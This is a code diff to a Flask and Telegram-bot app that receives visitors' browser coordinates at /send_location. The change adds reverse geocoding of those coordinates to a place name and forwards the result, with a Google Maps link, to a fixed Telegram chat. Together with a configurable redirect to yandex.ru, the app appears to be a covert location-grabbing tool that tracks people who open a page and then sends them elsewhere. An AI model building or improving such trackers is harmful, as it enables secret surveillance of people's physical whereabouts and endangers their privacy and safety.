@@ -4,6 +4,7 @@ from telebot import types
 import threading
 from flask_cors import CORS
 import os
+import requests
 
 # === Flask app ===
 app = Flask(__name__, static_folder='static')
@@ -22,6 +23,18 @@ redirect_url = "https://yandex.ru"
 def index():
     return send_from_directory(app.static_folder, 'index.html')
 
+def get_location_name(lat, lon):
+    try:
+        url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
+        headers = {'User-Agent': 'GeoBot'}
+        res = requests.get(url, headers=headers, timeout=5)
+        json_data = res.json()
+        return json_data.get('display_name', 'Неизвестное место')
+    except Exception as e:
+        print(f"Geocode error: {e}")
+        return 'Неизвестное место'
+
+
 # 📡 Получение геолокации от клиента
 @app.route('/send_location', methods=['POST'])
 def receive_location():
@@ -29,15 +42,19 @@ def receive_location():
     lat = data.get('latitude')
     lon = data.get('longitude')
     if lat and lon:
-        try:
-            # Сообщение с координатами
-            bot.send_message(CHAT_ID, f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}")
-            # Карта с точкой
-            bot.send_location(CHAT_ID, latitude=lat, longitude=lon)
-        except Exception as e:
-            print(f"Ошибка при отправке в Telegram: {e}")
+        location_name = get_location_name(lat, lon)
+        bot.send_message(CHAT_ID,
+            f"📍 Новая геолокация:\n"
+            f"Широта: {lat}\n"
+            f"Долгота: {lon}\n"
+            f"🌆 Место: {location_name}\n"
+            f"🌐 [Открыть в Google Maps](https://www.google.com/maps?q={lat},{lon})",
+            parse_mode="Markdown"
+        )
+        bot.send_location(CHAT_ID, latitude=lat, longitude=lon)
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 400
+
 
 # 🔁 Вернуть текущий redirect_url
 @app.route('/get_redirect')
